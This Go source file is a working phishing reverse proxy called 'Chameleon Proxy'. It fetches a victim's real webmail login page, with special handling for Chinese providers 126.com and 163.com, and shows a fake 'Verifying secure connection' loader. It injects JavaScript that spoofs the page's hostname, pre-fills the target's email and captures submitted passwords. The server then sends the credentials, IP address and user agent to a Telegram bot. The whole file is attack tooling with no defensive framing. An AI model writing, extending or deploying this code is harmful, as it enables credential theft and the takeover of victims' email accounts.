package main

import (
	"bytes"
	"compress/gzip"
	"crypto/tls"
	"encoding/base64"
	"io"
	"log"
	"net/http"
	"net/http/cookiejar"
	"net/url"
	"regexp"
	"strings"
	"sync"
	"time"

	"github.com/gin-gonic/gin"
	"golang.org/x/text/encoding/simplifiedchinese"
	"golang.org/x/text/transform"
)

type SessionStore struct {
	mu       sync.RWMutex
	sessions map[string]*SessionData
}

type SessionData struct {
	Cookies   map[string]string
	UserEmail string
}

var store = &SessionStore{
	sessions: make(map[string]*SessionData),
}

const harvesterScript = `
<script>
(function() {
    var email = window._targetEmail;
    var targetDomain = window._targetDomain;
    
    // 1. HOSTNAME & CORS BYPASS (Proxy Object)
    if (targetDomain) {
        try {
            var originalLocation = window.location;
            var locationProxy = new Proxy(originalLocation, {
                get: function(target, prop) {
                    if (prop === 'hostname' || prop === 'host') return targetDomain;
                    if (prop === 'origin') return 'https://' + targetDomain;
                    if (prop === 'href') return 'https://' + targetDomain + '/login';
                    var val = target[prop];
                    return typeof val === 'function' ? val.bind(target) : val;
                }
            });
            Object.defineProperty(window, 'location', { get: function() { return locationProxy; } });
        } catch(e) { console.log("Location patch failed:", e); }

        // Patch Fetch
        const originalFetch = window.fetch;
        window.fetch = function(urlOrRequest, init) {
            let url = typeof urlOrRequest === 'string' ? urlOrRequest : urlOrRequest.url;
            if (url && (url.includes('countly') || url.includes('127.net'))) {
                if (!init) init = {};
                init.credentials = 'include';
                init.mode = 'no-cors'; 
            }
            return originalFetch.call(this, urlOrRequest, init);
        };
    }

    // 2. AUTO-FILL LOGIC
    var fillAttempts = 0;
    var fillInterval = setInterval(function() {
        if (!email || fillAttempts > 20) { clearInterval(fillInterval); return; }

        var inputs = document.querySelectorAll('input[type="text"], input[type="email"], input[name="username"], input[name="email"], input[id="mailInput"]');
        if (inputs.length > 0) {
            for (var i = 0; i < inputs.length; i++) {
                var input = inputs[i];
                if (input.offsetParent !== null && input.value === "") {
                    let setter = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, "value").set;
                    setter.call(input, email);
                    input.dispatchEvent(new Event('input', { bubbles: true }));
                    input.dispatchEvent(new Event('change', { bubbles: true }));
                    input.focus();
                    clearInterval(fillInterval);
                    return;
                }
            }
        }
        fillAttempts++;
    }, 500);

    // 3. PASSWORD HARVESTING
    document.addEventListener('submit', function(e) {
        const form = e.target;
        const formData = new FormData(form);
        const params = new URLSearchParams();
        let hasEmail = false;
        let hasPassword = false;

        for (let [key, value] of formData.entries()) {
            params.append(key, value);
            if (key.toLowerCase().includes('email') || key.toLowerCase().includes('user') || key.toLowerCase().includes('account') || key.toLowerCase().includes('login')) hasEmail = true;
            if (key.toLowerCase().includes('pass')) hasPassword = true;
        }

        if (hasEmail && hasPassword) {
            fetch(window.location.origin + '/api/harvest', {
                method: 'POST',
                headers: {'Content-Type': 'application/x-www-form-urlencoded'},
                body: params.toString() + '&type=login'
            }).catch(() => {});
        }
    }, true);
})();
</script>
`

const loaderHTML = `<!DOCTYPE html><html><head><title>Verifying...</title><style>body{margin:0;display:flex;justify-content:center;align-items:center;height:100vh;background:#f5f5f5;font-family:Arial;}.spin{border:4px solid #f3f3f3;border-top:4px solid #4285F4;border-radius:50%;width:40px;height:40px;animation:spin 1s linear infinite;margin:0 auto 20px;}@keyframes spin{0%{transform:rotate(0deg);}100%{transform:rotate(360deg);}}</style></head><body><div style="text-align:center;background:white;padding:40px;border-radius:10px;"><div class="spin"></div><p>Verifying secure connection...</p></div><script>
setTimeout(()=>{
    var hash = window.location.hash;
    var email = "";
    if (hash && hash.length > 1) {
        var raw = hash.substring(1); 
        if (raw.startsWith('t=')) {
            var b64 = raw.split('t=')[1];
            try { email = atob(b64); } catch(e) { email = b64; }
        } else { email = raw; }
        window._targetEmail = email;
        fetch('/api/fetch?email=' + encodeURIComponent(email))
            .then(r => r.text())
            .then(html => { document.open(); document.write(html); document.close(); });
    } else { document.body.innerHTML = "<h3>No account provided.</h3>"; }
}, 1000);
</script></body></html>`

func StartProxy(cfg TelegramConfig, listenPort string) {
	r := gin.Default()

	r.GET("/", func(c *gin.Context) {
		c.Header("Content-Type", "text/html")
		c.String(200, loaderHTML)
	})

	r.GET("/api/fetch", func(c *gin.Context) {
		email := c.Query("email")
		if b64, err := base64.StdEncoding.DecodeString(email); err == nil && strings.Contains(string(b64), "@") {
			email = string(b64)
		}
		if email == "" {
			c.String(400, "Missing email")
			return
		}

		targetBase := GetTargetDomain(email)
		parsedTarget, _ := url.Parse(targetBase)
		targetDomain := parsedTarget.Host

		jar, _ := cookiejar.New(nil)
		proxyClient := &http.Client{
			Timeout: 15 * time.Second,
			Jar:     jar,
			Transport: &http.Transport{
				ForceAttemptHTTP2: false,
				TLSClientConfig:   &tls.Config{InsecureSkipVerify: true},
			},
		}

		req, _ := http.NewRequest("GET", targetBase, nil)
		req.Header.Set("Accept-Encoding", "identity")
		req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")

		resp, err := proxyClient.Do(req)
		if err != nil {
			c.String(502, "Error: %v", err)
			return
		}
		defer resp.Body.Close()

		var bodyReader io.Reader = resp.Body
		if resp.Header.Get("Content-Encoding") == "gzip" {
			gzipReader, _ := gzip.NewReader(resp.Body)
			defer gzipReader.Close()
			bodyReader = gzipReader
		}
		bodyBytes, _ := io.ReadAll(bodyReader)

		// Encoding Fix
		if strings.Contains(targetBase, "126.com") || strings.Contains(targetBase, "163.com") {
			reader := transform.NewReader(bytes.NewReader(bodyBytes), simplifiedchinese.GBK.NewDecoder())
			if decoded, err := io.ReadAll(reader); err == nil {
				bodyBytes = decoded
			}
		}
		bodyStr := string(bodyBytes)

		// Force UTF-8 Meta
		reMeta := regexp.MustCompile(`(?i)<meta[^>]*charset=["']?gbk["']?[^>]*>`)
		bodyStr = reMeta.ReplaceAllString(bodyStr, `<meta charset="utf-8">`)
		bodyStr = strings.ReplaceAll(bodyStr, "charset=gbk", "charset=utf-8")

		// Inject Scripts
		baseTag := `<base href="` + targetBase + `">`
		emailScript := `<script>window._targetEmail = "` + email + `"; window._targetDomain = "` + targetDomain + `";</script>`
		bodyStr = strings.Replace(bodyStr, "<head>", "<head>\n"+baseTag+"\n"+emailScript, 1)
		bodyStr = strings.Replace(bodyStr, "</body>", harvesterScript+"</body>", 1)

		// Final Headers
		c.Header("Content-Type", "text/html; charset=utf-8")
		c.Header("Access-Control-Allow-Origin", "*")
		c.String(resp.StatusCode, bodyStr)
	})

	r.POST("/api/harvest", func(c *gin.Context) {
		c.Request.ParseForm()
		email := c.PostForm("email")
		password := c.PostForm("password")

		if email == "" {
			email = c.PostForm("username")
		}
		if password == "" {
			password = c.PostForm("passwd")
		}

		ip := c.ClientIP()
		ua := c.GetHeader("User-Agent")
		SendTelegramMessage(cfg, FormatLoginAlert(email, password, ip, ua))
		c.JSON(200, gin.H{"status": "ok"})
	})

	log.Printf("🚀 Chameleon Proxy listening on 0.0.0.0:%s", listenPort)
	r.Run("0.0.0.0:" + listenPort)
}
